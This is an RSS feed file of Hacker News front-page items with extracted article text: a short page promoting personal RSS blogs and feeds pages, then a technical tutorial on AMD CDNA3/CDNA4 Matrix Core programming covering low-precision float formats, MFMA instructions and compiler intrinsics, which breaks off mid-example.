<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Sun, 05 Oct 2025 14:33:51 +0000</lastBuildDate><item><title>Blog Feeds</title><link>https://blogfeeds.net</link><description>&lt;doc fingerprint="779f1fb99e6586b5"&gt;
  &lt;main&gt;
    &lt;p&gt;Tired of social media?&lt;/p&gt;
    &lt;p&gt;Keep doom scrolling through addicting feeds?&lt;/p&gt;
    &lt;p&gt;Miss the days when the web was just about connecting with people and their thoughts or ideas?&lt;/p&gt;
    &lt;p&gt;We believe there's an answer to that problem, and it's called&lt;/p&gt;
    &lt;p&gt;Starting a blog is actually a lot simpler than what you're probably thinking. This doesn't have to be some well polished highly viewed monetization machine, or even something professional or formal. It's just a simple website where you can casually talk about whatever you want to talk about! It can be long, short, a list of small things, or just a quote. It should be how you talk with other people in your own life, or how you communicate with the outside world. It should be you on a page. Here's a few places you can make a blog that are RSS enabled:&lt;/p&gt;
    &lt;p&gt;RSS is actually already familiar to you if you have ever subscribed to a newsletter. You put your email into someoneâs website, and when they have updates, they send you emails to your inbox so you can stay in the loop. In the case of RSS, you have a dedicated app, called an RSS reader usually, and you can put in someoneâs website into the app to subscribe. When they make a new post, just open your news reader app, and their posts will be retrieved and ready to read. Some reader apps even let you make folders and tags to organize blogs you are subscribed to, similar to how an email app lets you make folders to sort mail. Would highly recommend trying a few of the apps or services and seeing which works best!&lt;/p&gt;
    &lt;p&gt;This takes us to our final point: Feeds. You can probably get away with just the first two items and then sharing it with people you already know, but what about meeting or talking to people you don't know? That's where Feeds come in. The idea is to create another page on your blog that has all the RSS feeds you're subscribed to. By keeping this public and always up to date, someone can visit your page, find someone new and follow them. Perhaps that person also has a feeds page, and the cycle continues until there is a natural and organic network of people all sharing with each other. So if you have a blog, consider making a feeds page and sharing it! If your RSS reader supports OPML file exports and imports, perhaps you can share that file as well to make it easier to share your feeds.&lt;/p&gt;
    &lt;p&gt;Here's an example Feeds Page which should help get the idea across!&lt;/p&gt;
    &lt;p&gt;The best part about blog feeds? It's just an idea. There's no central authority. There's no platform. No massive tech giant trying to take your data. It's just you, basic web standards, and the people you care about.&lt;/p&gt;
    &lt;p&gt;Made by Steve&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45475808</guid><pubDate>Sat, 04 Oct 2025 19:08:46 +0000</pubDate></item><item><title>Matrix Core Programming on AMD GPUs</title><link>https://salykova.github.io/matrix-cores-cdna</link><description>&lt;doc fingerprint="179c1252016d1d30"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Matrix Core Programming on AMD CDNA3 and CDNA4 architecture&lt;/head&gt;
    &lt;p&gt;TL;DR In this blog post, we walk through how to use Matrix Cores in HIP kernels, with a focus on low-precision data types such as FP16, FP8, and FP4, as well as the new family of Matrix Core instructions with exponent block scaling introduced in the AMD CDNA™4 architecture. Through code examples and illustrations, we provide the necessary knowledge to start programming Matrix Cores, covering modern low-precision floating-point types, the Matrix Core compiler intrinsics, and the data layouts required by the Matrix Core instructions. The blog post is also available on ROCm Blogs.&lt;/p&gt;
    &lt;head rend="h2"&gt;1. Matrix Cores&lt;/head&gt;
    &lt;p&gt;Matrix multiplication is an essential part of AI and HPC workloads. The AMD CDNA™ architecture features special-purpose hardware, the Matrix Cores, to accelerate matrix fused-multiply-add (MFMA) operations defined as &lt;code&gt;D:=A*B+C&lt;/code&gt;. Please note that MFMA instructions are often used to update a matrix in-place (=accumulation) so that &lt;code&gt;D=C&lt;/code&gt; and &lt;code&gt;C:=A*B+C&lt;/code&gt;. The matrices &lt;code&gt;A&lt;/code&gt; and &lt;code&gt;B&lt;/code&gt; are called input matrices, while the matrix &lt;code&gt;D&lt;/code&gt; is referred to as the output matrix or accumulator.&lt;/p&gt;
    &lt;p&gt;The performance gains from using Matrix Cores are especially significant in mixed-precision mode, where the input matrices use lower-precision data types instead of FP32. The output matrix, however, is stored in FP32 to minimize accuracy loss during accumulation. The tables below show the theoretical peak performance of Matrix Cores with different input data types on both AMD CDNA™3 and AMD CDNA™4 architectures. On the AMD Instinct™ MI325X, using FP16 input matrices delivers nearly an 8x performance increase compared to single-precision, with only minimal accuracy loss. Switching to FP8 further doubles the performance providing a 16x increase when compared to FP32. The AMD CDNA™4 architecture further improves Matrix Core performance, delivering up to 2x higher throughput for FP16 and FP8 compared to the AMD CDNA™3 architecture. In addition, AMD CDNA™4 introduces new low-precision data types such as FP6 and FP4, enabling up to 64x performance gain relative to FP32. Please refer to the AMD CDNA™3 and AMD CDNA™4 white papers for detailed architecture specifications.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;AMD Instinct™ MI325X (CDNA™3)&lt;/cell&gt;
        &lt;cell role="head"&gt;Speedup vs. FP32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP64&lt;/cell&gt;
        &lt;cell&gt;163.4 TF&lt;/cell&gt;
        &lt;cell&gt;1x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP32&lt;/cell&gt;
        &lt;cell&gt;163.4 TF&lt;/cell&gt;
        &lt;cell&gt;1x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP16&lt;/cell&gt;
        &lt;cell&gt;1307.4 TF&lt;/cell&gt;
        &lt;cell&gt;~8x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Matrix FP8&lt;/cell&gt;
        &lt;cell&gt;2614.9 TF&lt;/cell&gt;
        &lt;cell&gt;~16x&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;AMD Instinct™ MI355X (CDNA™4)&lt;/cell&gt;
        &lt;cell role="head"&gt;Speedup vs. FP32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP64&lt;/cell&gt;
        &lt;cell&gt;78.6 TF&lt;/cell&gt;
        &lt;cell&gt;~0.5x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP32&lt;/cell&gt;
        &lt;cell&gt;157.3 TF&lt;/cell&gt;
        &lt;cell&gt;1x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP16&lt;/cell&gt;
        &lt;cell&gt;2.5 PF&lt;/cell&gt;
        &lt;cell&gt;~16x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP8&lt;/cell&gt;
        &lt;cell&gt;5 PF&lt;/cell&gt;
        &lt;cell&gt;~32x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Matrix FP6&lt;/cell&gt;
        &lt;cell&gt;10 PF&lt;/cell&gt;
        &lt;cell&gt;~64x&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Matrix FP4&lt;/cell&gt;
        &lt;cell&gt;10 PF&lt;/cell&gt;
        &lt;cell&gt;~64x&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h2"&gt;2. Low-Precision Floating-Point Types&lt;/head&gt;
    &lt;p&gt;A binary representation of a floating-point number consists of &lt;code&gt;n&lt;/code&gt; bits, where &lt;code&gt;m&lt;/code&gt; of &lt;code&gt;n&lt;/code&gt; bits represent the mantissa, 1 bit determines the sign and &lt;code&gt;n-m-1&lt;/code&gt; bits represent the exponent. The following image illustrates the binary format of a floating-point number and how the exponent and mantissa are calculated based on its binary representation.&lt;/p&gt;
    &lt;p&gt;Figure 1: Binary representation of a floating-point number.&lt;/p&gt;
    &lt;p&gt;Floating-point types are characterized by the number of bits used for the exponent and for the mantissa. Increasing the exponent width extends the range of representable values, while increasing the mantissa width improves precision. Since all floating-point types include the sign bit, a shorthand notation typically specifies only the exponent and mantissa widths. For example, the E4M3 type is an 8-bit floating-point type with 4-bit exponent and 3-bit mantissa. Additionally, a floating-point type is specified by exponent bias - a number that is subtracted from the exponent during conversion from binary format to real value. Given the exponent width, mantissa width, and exponent bias, one can convert the binary representation of a floating-point type (except E8M0) into its real value using the following equation:&lt;/p&gt;
    &lt;p&gt;Figure 2: Conversion to real value from binary representation for floating-point numbers.&lt;/p&gt;
    &lt;p&gt;Please note that the equation takes different forms depending on whether the exponent is zero or not. Often, certain exponent and mantissa values are reserved for special values (e.g. &lt;code&gt;NaN&lt;/code&gt;, &lt;code&gt;Infinity&lt;/code&gt;), which limits the range of representable real numbers. For example, the FP16 type has 5-bit exponent with a nominal range of &lt;code&gt;[0, 1, ... 2^5-1] = [0, 1, ... 31]&lt;/code&gt;. However, the exponent value &lt;code&gt;E = 31&lt;/code&gt; is reserved for &lt;code&gt;NaN&lt;/code&gt; (if the mantissa &lt;code&gt;M != 0&lt;/code&gt;) and &lt;code&gt;infinity&lt;/code&gt; (if the mantissa &lt;code&gt;M = 0&lt;/code&gt;). Therefore, the largest exponent value that can represent a real number is &lt;code&gt;E = 30&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;The following table summarizes low-precision types commonly used in modern AI/ML workloads:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="7"&gt;
        &lt;cell role="head"&gt;Width&lt;/cell&gt;
        &lt;cell role="head"&gt;Shorthand&lt;/cell&gt;
        &lt;cell role="head"&gt;Exp. bias&lt;/cell&gt;
        &lt;cell role="head"&gt;Range&lt;/cell&gt;
        &lt;cell role="head"&gt;Zero&lt;/cell&gt;
        &lt;cell role="head"&gt;NaN&lt;/cell&gt;
        &lt;cell role="head"&gt;Infinity&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;16-Bit&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E5M10 (FP16)&lt;/cell&gt;
        &lt;cell&gt;15&lt;/cell&gt;
        &lt;cell&gt;±65504&lt;/cell&gt;
        &lt;cell&gt;S 00000 0000000000&lt;/cell&gt;
        &lt;cell&gt;S 11111 xxxxxxxxxx&lt;/cell&gt;
        &lt;cell&gt;S 11111 0000000000&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E8M7 (BF16)&lt;/cell&gt;
        &lt;cell&gt;127&lt;/cell&gt;
        &lt;cell&gt;±3.3895 * 10^38&lt;/cell&gt;
        &lt;cell&gt;S 00000000 0000000&lt;/cell&gt;
        &lt;cell&gt;S 11111111 xxxxxxx&lt;/cell&gt;
        &lt;cell&gt;S 11111111 0000000&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;8-Bit&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E4M3FN (FP8, OCP)&lt;/cell&gt;
        &lt;cell&gt;7&lt;/cell&gt;
        &lt;cell&gt;±448&lt;/cell&gt;
        &lt;cell&gt;S 0000 000&lt;/cell&gt;
        &lt;cell&gt;S 1111 111&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E4M3FNUZ (FP8)&lt;/cell&gt;
        &lt;cell&gt;8&lt;/cell&gt;
        &lt;cell&gt;±240&lt;/cell&gt;
        &lt;cell&gt;0 0000 000&lt;/cell&gt;
        &lt;cell&gt;1 0000 000&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E5M2 (BF8, OCP)&lt;/cell&gt;
        &lt;cell&gt;15&lt;/cell&gt;
        &lt;cell&gt;±57344&lt;/cell&gt;
        &lt;cell&gt;S 00000 00&lt;/cell&gt;
        &lt;cell&gt;S 11111 {01, 10 11}&lt;/cell&gt;
        &lt;cell&gt;S 11111 00&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E5M2FNUZ (BF8)&lt;/cell&gt;
        &lt;cell&gt;16&lt;/cell&gt;
        &lt;cell&gt;±57344&lt;/cell&gt;
        &lt;cell&gt;0 00000 00&lt;/cell&gt;
        &lt;cell&gt;S 00000 00&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E8M0&lt;/cell&gt;
        &lt;cell&gt;127&lt;/cell&gt;
        &lt;cell&gt;2^(±127)&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
        &lt;cell&gt;11111111&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;6-Bit&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E2M3&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;±7.5&lt;/cell&gt;
        &lt;cell&gt;S 00 000&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;E3M2 (BF6)&lt;/cell&gt;
        &lt;cell&gt;3&lt;/cell&gt;
        &lt;cell&gt;±28&lt;/cell&gt;
        &lt;cell&gt;S 000 00&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;4-Bit&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;E2M1 (FP4)&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;±6&lt;/cell&gt;
        &lt;cell&gt;S 00 0&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
        &lt;cell&gt;n/a&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Please note that the E4M3 type has two variants: E4M3FN and E4M3FNUZ. Both E4M3FN and E4M3FNUZ use 4 bits for the exponent and 3 bits for the mantissa. They use different exponent biases and differ in the special values they can represent. Neither variant supports infinities, which is why their notations include FN (FiNite). However, E4M3FN supports &lt;code&gt;+0&lt;/code&gt;, &lt;code&gt;-0&lt;/code&gt;, &lt;code&gt;+NaN&lt;/code&gt; and &lt;code&gt;-Nan&lt;/code&gt;, while E4M3FNUZ supports only &lt;code&gt;+0&lt;/code&gt; and &lt;code&gt;NaN&lt;/code&gt;, hence &lt;code&gt;UZ&lt;/code&gt; (Unsigned Zero). The image below demonstrates how to convert a binary sequence into a real value, using E4M3FNUZ type as an example:&lt;/p&gt;
    &lt;p&gt;Figure 3: E4M3FNUZ encoding details.&lt;/p&gt;
    &lt;p&gt;FP8 types are divided into E4M3 and E5M2 formats. The E5M2 format is sometimes referred to as BF8, similar to BF16, where exponent width is larger compared to FP16. Similar to E4M3, E5M2 is further subdivided into two variants: E5M2 (OCP) and E5M2FNUZ. The AMD CDNA™3 architecture uses FNUZ variants for both E4M3 and E5M2, whereas the CDNA™4 architecture uses E4M3FN and E5M2 (OCP) variants. E4M3FN and E5M2 are standardized formats defined by the Open Compute Project (OCP). For detailed specifications, see the OCP Microscaling Formats (MX) Specification and the ONNX documentation. For visualization of FP8 values and their binary representations please refer to the FP8 Data table. Additionally, see the chapter “Low-precision floating-point types” in the AMD ROCm™ documentation for details on using low-precision types in HIP.&lt;/p&gt;
    &lt;p&gt;There is a special 8-bit format, E8M0, which is not used as a standard element data type but instead serves as a scale factor for microscaling types and block-scaled MFMA operations (discussed later in this article). Its value is calculated according to the equation below:&lt;/p&gt;
    &lt;p&gt;Figure 4: E8M0 encoding details.&lt;/p&gt;
    &lt;p&gt;The exponent value &lt;code&gt;E = 255&lt;/code&gt; is reserved for &lt;code&gt;NaN&lt;/code&gt; values, limiting the range of representable real numbers to &lt;code&gt;[2^-127 ... 2^127]&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Similar to FP8, FP6 has two formats: E2M3 and E3M2. The latter, E3M2, is often referred to as BF6 due to its larger exponent width compared to E2M3.&lt;/p&gt;
    &lt;head rend="h2"&gt;3. Matrix fused-multiply-add (MFMA) Instructions&lt;/head&gt;
    &lt;p&gt;The AMD CDNA™3 and CDNA™4 architectures support a variety of MFMA operations, which are characterized by the matrix dimensions &lt;code&gt;M&lt;/code&gt;, &lt;code&gt;N&lt;/code&gt;, &lt;code&gt;K&lt;/code&gt; and the data type of input/output matrices. The following table lists all available floating-point MFMA instructions for the AMD CDNA™3 and CDNA™4 architectures. As can be seen from the table, the AMD CDNA™4 architecture extends the set of available MFMA instructions by adding new FP16/BF16 instructions with larger matrix dimensions. Furthermore, it introduces FP6/FP4 data types and provides a completely new set of FP8/FP6/FP4 instructions where the types can be independently used for the matrices &lt;code&gt;A&lt;/code&gt; and &lt;code&gt;B&lt;/code&gt;. Finally, the AMD CDNA™4 architecture enables MFMA with block exponent scaling.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="5"&gt;
        &lt;cell role="head"&gt;Type (C,D) ← (A,B)&lt;/cell&gt;
        &lt;cell role="head"&gt;MxNxK (CDNA™3)&lt;/cell&gt;
        &lt;cell role="head"&gt;MxNxK (CDNA™4)&lt;/cell&gt;
        &lt;cell role="head"&gt;Cycles&lt;/cell&gt;
        &lt;cell role="head"&gt;Note&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP64 ← FP64&lt;/cell&gt;
        &lt;cell&gt;16x16x4&lt;/cell&gt;
        &lt;cell&gt;16x16x4&lt;/cell&gt;
        &lt;cell&gt;64&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP32 ← FP32&lt;/cell&gt;
        &lt;cell&gt;32x32x2&lt;/cell&gt;
        &lt;cell&gt;32x32x2&lt;/cell&gt;
        &lt;cell&gt;64&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;16x16x4&lt;/cell&gt;
        &lt;cell&gt;16x16x4&lt;/cell&gt;
        &lt;cell&gt;32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP32 ← FP16 (BF16)&lt;/cell&gt;
        &lt;cell&gt;32x32x8&lt;/cell&gt;
        &lt;cell&gt;32x32x8&lt;/cell&gt;
        &lt;cell&gt;32&lt;/cell&gt;
        &lt;cell&gt;Both A and B are either FP16 or BF16&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;16x16x16&lt;/cell&gt;
        &lt;cell&gt;16x16x16&lt;/cell&gt;
        &lt;cell&gt;16&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;16x16x32&lt;/cell&gt;
        &lt;cell&gt;16&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;32x32x16&lt;/cell&gt;
        &lt;cell&gt;32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP32 ← FP8&lt;/cell&gt;
        &lt;cell&gt;16x16x32&lt;/cell&gt;
        &lt;cell&gt;16x16x32&lt;/cell&gt;
        &lt;cell&gt;16&lt;/cell&gt;
        &lt;cell&gt;FP8 (E4M3) or BF8 (E5M2) can be used independently for A and B&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;32x32x16&lt;/cell&gt;
        &lt;cell&gt;32x32x16&lt;/cell&gt;
        &lt;cell&gt;32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP32 ← FP8/FP6/FP4&lt;/cell&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;16x16x128&lt;/cell&gt;
        &lt;cell&gt;16 or 32&lt;/cell&gt;
        &lt;cell&gt;FP4, FP6 or FP8 can be used independently for A and B. Larger cycle count if either matrix A or B is FP8&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;32x32x64&lt;/cell&gt;
        &lt;cell&gt;32 or 64&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;FP32 ← MXFP8/MXFP6/MXFP4&lt;/cell&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;16x16x128&lt;/cell&gt;
        &lt;cell&gt;16 or 32&lt;/cell&gt;
        &lt;cell&gt;FP4, FP6 or FP8 can be used independently for A and B. Larger cycle count if either matrix A or B is FP8&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;32x32x64&lt;/cell&gt;
        &lt;cell&gt;32 or 64&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Please note that the table lists only floating-point type MFMA instructions with batch size = 1. In addition to them, the AMD CDNA™3 and CDNA™4 architectures support batched MFMA operations, where multiple output matrices are computed in parallel. These instructions are not covered in this article. See the Chapter 7 “Matrix Arithmetic Instructions” in the AMD CDNA™3 and AMD CDNA™4 ISA reference guides for the full list of available MFMA instructions.&lt;/p&gt;
    &lt;p&gt;The table above specifies cycle count for each MFMA operation. Given a known cycle count, one can estimate theoretical peak performance in TFLOP/s of corresponding MFMA operation using the formula below:&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;
2*M*N*K * num_matrix_cores * (max_engine_clock / cycle_count) / 10^6,
&lt;/code&gt;
    &lt;/p&gt;
    &lt;p&gt;where&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;num_matrix_cores&lt;/code&gt;is total number of matrix cores in a GPU (specified in white paper)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;max_engine_clock&lt;/code&gt;is max engine clock (peak) in MHz (specified in white paper)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;cycle_count&lt;/code&gt;is cycle count of corresponding MFMA instruction&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;M, N, K&lt;/code&gt;are matrix dimensions&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Using this formula and the MFMA instruction &lt;code&gt;32x32x8 FP16&lt;/code&gt; as an example, we can estimate theoretical peak FP16 Matrix Core performance on the AMD Instinct™ MI325X:&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;2*32*32*8 * 1216 * (2100 / 32) / 10^6 = 1307.4 TFLOP/s&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;4. Compiler Intrinsics&lt;/head&gt;
    &lt;p&gt;To use Matrix Core instructions in HIP kernels, LLVM provides built-in compiler intrinsic functions. The list of all available compiler intrinsics can be found in the LLVM Github repository. The syntax of the MFMA intrinsics has the following format:&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;d_reg = __builtin_amdgcn_mfma_ODType_MxNxKInDType(a_reg, b_reg, c_reg, cbsz, abid, blgp)&lt;/code&gt;,&lt;/p&gt;
    &lt;p&gt;where&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;MxNxK&lt;/code&gt;specifies the shapes of the matrices&lt;code&gt;A&lt;/code&gt;,&lt;code&gt;B&lt;/code&gt;,&lt;code&gt;C&lt;/code&gt;,&lt;code&gt;D&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;ODType&lt;/code&gt;is data type of the matrices&lt;code&gt;C&lt;/code&gt;and&lt;code&gt;D&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;InDType&lt;/code&gt;is data type of the input matrices&lt;code&gt;A&lt;/code&gt;and&lt;code&gt;B&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;a_reg&lt;/code&gt;is a scalar/vector containing a portion of the matrix&lt;code&gt;A&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;b_reg&lt;/code&gt;is a scalar/vector containing a portion of the matrix&lt;code&gt;B&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;c_reg&lt;/code&gt;is a vector containing a portion of the matrix&lt;code&gt;C&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;d_reg&lt;/code&gt;is a vector containing a portion of the matrix&lt;code&gt;D&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;cbsz&lt;/code&gt;,&lt;code&gt;abid&lt;/code&gt;,&lt;code&gt;blgp&lt;/code&gt;are broadcast flags. For the following discussion, these flags are irrelevant and are, therefore, set to 0 by default, unless specified otherwise. Please refer to the ISA reference guide for detailed information on the broadcast flags.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For example,&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;__builtin_amdgcn_mfma_f32_16x16x16f16&lt;/code&gt;performs&lt;code&gt;16x16x16&lt;/code&gt;MFMA, where both input matrices&lt;code&gt;A&lt;/code&gt;and&lt;code&gt;B&lt;/code&gt;have type&lt;code&gt;FP16&lt;/code&gt;and the output matrix has type&lt;code&gt;FP32&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;__builtin_amdgcn_mfma_f32_32x32x16_fp8_fp8&lt;/code&gt;performs&lt;code&gt;32x32x16&lt;/code&gt;MFMA, where both input matrices&lt;code&gt;A&lt;/code&gt;and&lt;code&gt;B&lt;/code&gt;have type&lt;code&gt;FP8(E4M3)&lt;/code&gt;and the output matrix is stored in&lt;code&gt;FP32&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;__builtin_amdgcn_mfma_f32_32x32x16_fp8_bf8&lt;/code&gt;performs&lt;code&gt;32x32x16&lt;/code&gt;MFMA, where the matrix&lt;code&gt;A&lt;/code&gt;has type&lt;code&gt;FP8(E4M3)&lt;/code&gt;and the matrix&lt;code&gt;B&lt;/code&gt;has type&lt;code&gt;BF8(E5M2)&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The MFMA instructions are wavefront-level (warp-level) instructions, where all work-items (threads) within a wavefront collectively perform a single MFMA operation and the operands &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;B&lt;/code&gt;, &lt;code&gt;C&lt;/code&gt;, &lt;code&gt;D&lt;/code&gt; are distributed across work-items so that each work-item in the wavefront holds a portion of the operands. In order to use the MFMA instructions, it’s required to understand how the operands are distributed across threads within a wavefront. The ISA reference guide fully specifies the data layout for all available MFMA instructions. For illustrative purposes, the next chapter explains a subset of the MFMA instructions and the corresponding data layouts.&lt;/p&gt;
    &lt;head rend="h2"&gt;5. Examples&lt;/head&gt;
    &lt;quote&gt;&lt;p&gt;Important note: In the following discussion we assume the matrices are stored in row-major order. The wavefront size on the AMD CDNA™ architecture is 64. The shapes of the matrices&lt;/p&gt;&lt;code&gt;A&lt;/code&gt;,&lt;code&gt;B&lt;/code&gt;,&lt;code&gt;C&lt;/code&gt;,&lt;code&gt;D&lt;/code&gt;are&lt;code&gt;MxK&lt;/code&gt;,&lt;code&gt;KxN&lt;/code&gt;,&lt;code&gt;MxN&lt;/code&gt;, and&lt;code&gt;MxN&lt;/code&gt;, respectively. The first dimension denotes the number of rows and the second dimension the number of columns in a matrix. For example, the matrix&lt;code&gt;A&lt;/code&gt;has&lt;code&gt;M&lt;/code&gt;rows and&lt;code&gt;K&lt;/code&gt;columns.&lt;/quote&gt;
    &lt;head rend="h3"&gt;5.1. __builtin_amdgcn_mfma_f32_32x32x2f32&lt;/head&gt;
    &lt;p&gt;In this example we will multiply matrix &lt;code&gt;A&lt;/code&gt; of size &lt;code&gt;32x2&lt;/code&gt; with matrix &lt;code&gt;B&lt;/code&gt; of size &lt;code&gt;2x32&lt;/code&gt; using single wavefront (64 threads) and single MFMA instruction. The output matrix &lt;code&gt;C&lt;/code&gt; has shape &lt;code&gt;32x32&lt;/code&gt;. The input and output matrices are FP32. Since threads within a wavefront collectively perform single MFMA instruction, the operands are distributed across the threads. Each thread stores&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;M * K / wavefront_size = 32 * 2 / 64 = 1&lt;/code&gt;entries of the matrix&lt;code&gt;A&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;K * N / wavefront_size = 2 * 32 / 64 = 1&lt;/code&gt;entries of the matrix&lt;code&gt;B&lt;/code&gt;&lt;/item&gt;
